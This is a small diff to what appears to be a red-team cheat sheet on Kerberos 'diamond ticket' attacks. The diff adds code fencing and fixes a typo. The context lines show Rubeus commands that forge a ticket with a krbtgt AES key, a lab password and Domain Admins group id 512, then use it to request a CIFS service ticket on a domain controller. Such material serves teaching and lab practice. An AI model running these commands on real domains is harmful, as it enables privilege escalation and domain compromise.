@@ -528,13 +528,15 @@ A diamond ticket is quite different from a [Golden Ticket](#golden-ticket) becau
 | krbtgt AES-256 Key  | 8161d45ac308add4c553fad55fe70d8ce8c06160eeeb720df8bcbf16575400ee |
 | User in PAC         | rangeadm                                                         |
 1. Request a diamond key with [Rubeus](https://github.com/GhostPack/Rubeus). It does the following steps:-
+	```
 	i. Request normal user TGT
 	ii. Decrypt the TGT with krbtgt aes key
 	iii. Modify ticket PAC and insert _rangeadm_ in the PAC
+	```
 ```
 Rubeus.exe diamond /krbkey:8161d45ac308add4c553fad55fe70d8ce8c06160eeeb720df8bcbf16575400ee /user:loki /password:Password123 /enctype:aes /domain:range.net /dc:dc01.range.net /ticketuser:rangeadm /ticketuserid:1104 /groups:512 /nowrap
 ```
-2. To very the Diamond ticket (modified TGT), requst a service ticket (TGS)
+2. To verify the Diamond ticket (modified TGT), requst a service ticket (TGS)
 ```
 .\Rubeus.exe asktgs /ticket:<tgt> /service:cifs/dc01.range.net /nowrap
 ```
